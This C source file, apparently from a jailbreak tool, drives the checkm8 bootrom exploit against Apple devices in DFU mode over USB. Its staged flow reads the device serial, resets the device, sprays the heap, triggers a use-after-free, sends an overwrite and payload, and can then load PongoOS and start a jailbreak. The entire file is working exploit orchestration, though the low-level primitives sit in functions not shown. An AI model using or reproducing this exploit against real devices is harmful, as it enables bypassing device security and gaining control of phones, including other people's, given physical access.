#include <exploit/exploit.h>

bool checkm8(usb_handle_t *handle, enum ExploitMode mode) {
    struct DeviceConfiguration deviceConfig;
    struct PayloadConfiguration payloadConfig;
    bool ret = false;

    /* Testing */
    // wait_usb_handle(handle);
    // ret = true;
    // goto pongo;

    int stage = STAGE_PREPARE;
    LOG(LOG_INFO, "Waiting for device in DFU mode...");
    while (stage != STAGE_DONE && wait_usb_handle(handle)) {
        if (stage == STAGE_PREPARE) {
            char *serialNumber = get_usb_device_serial_number(handle);
            if (!serialNumber) { goto finished; }
            if (!checkm8_find_device_configuration_for_cpid(dfu_serial_number_get_cpid(serialNumber), &deviceConfig)) { goto finished; }
            if (!checkm8_find_payload_configuration_for_cpid(dfu_serial_number_get_cpid(serialNumber), &payloadConfig)) { goto finished; }
            if (dfu_serial_number_is_in_yolo_dfu(serialNumber)) { LOG(LOG_INFO, "Found device in Yolo DFU mode!"); goto yolodfu; }
            // if (device_serial_number_is_in_pongo_os(serialNumber)) { LOG(LOG_INFO, "Found device in PongoOS!"); goto pongo; }
            if (dfu_serial_number_is_pwned(serialNumber)) { LOG(LOG_ERROR, "Device is already pwned!"); return true; }
            if (!dfu_serial_number_is_in_dfu_mode(serialNumber)) { LOG(LOG_ERROR, "Device is not in DFU mode!"); return false; }
            stage = STAGE_RESET;
        }
        if (stage == STAGE_RESET) {
            LOG(LOG_VERBOSE, "Resetting device...");
            ret = checkm8_reset(handle);
            LOG(ret ? LOG_SUCCESS : LOG_ERROR, "Reset %s.", ret ? "succeeded" : "failed");
            stage = STAGE_HEAP_SPRAY;
        }
        else if (stage == STAGE_HEAP_SPRAY) {
            LOG(LOG_INFO, "Spraying the heap...");
            ret = checkm8_heap_feng_shui(handle, &deviceConfig);
            LOG(ret ? LOG_SUCCESS : LOG_ERROR, "Heap spray %s.", ret ? "succeeded" : "failed");
            stage = STAGE_TRIGGER;
        }
        else if (stage == STAGE_TRIGGER) {
            LOG(LOG_INFO, "Triggering UaF...");
            ret = checkm8_trigger_UaF(handle, &deviceConfig);
            LOG(ret ? LOG_SUCCESS : LOG_ERROR, "Trigger %s.", ret ? "succeeded" : "failed");
            stage = STAGE_PATCH;
        }
        else if (stage == STAGE_PATCH) {
            LOG(LOG_INFO, "Patching...");
            ret = checkm8_send_overwrite_and_payload(handle, &deviceConfig, &payloadConfig, mode == MODE_PONGOOS);
            LOG(ret ? LOG_SUCCESS : LOG_ERROR, "Patching %s.", ret ? "succeeded" : "failed");
            stage = STAGE_DONE;
            if (ret) {
                wait_usb_handle(handle);
                char *serial = get_usb_device_serial_number(handle);
                LOG(LOG_VERBOSE, "Device serial number: %s.", serial);
                if (mode == MODE_PONGOOS) {
                yolodfu:
                    LOG(LOG_INFO, "Sending PongoOS to Yolo DFU.");
                    reset_usb_handle(handle);
                    close_usb_handle(handle);
                    sleep(2);

                    ret = send_pongo_to_yolo_dfu(handle);
                    if (ret && args.jailbreak) {
                        pongo_jailbreak(handle);
                    }
                    goto finished;
                }
                ret = dfu_serial_number_is_pwned(serial);
                goto finished;
            }
            close_usb_handle(handle);
        }
        reset_usb_handle(handle);
    }
finished:
    if (ret) {
        LOG(LOG_SUCCESS, "%s succeeded.", mode == MODE_PONGOOS ? "Booting PongoOS" : "Exploit");
    } else {
        LOG(LOG_ERROR, "Exploit failed at stage %d!", stage == STAGE_PREPARE ? stage : stage - 1);
    }
    return ret;
}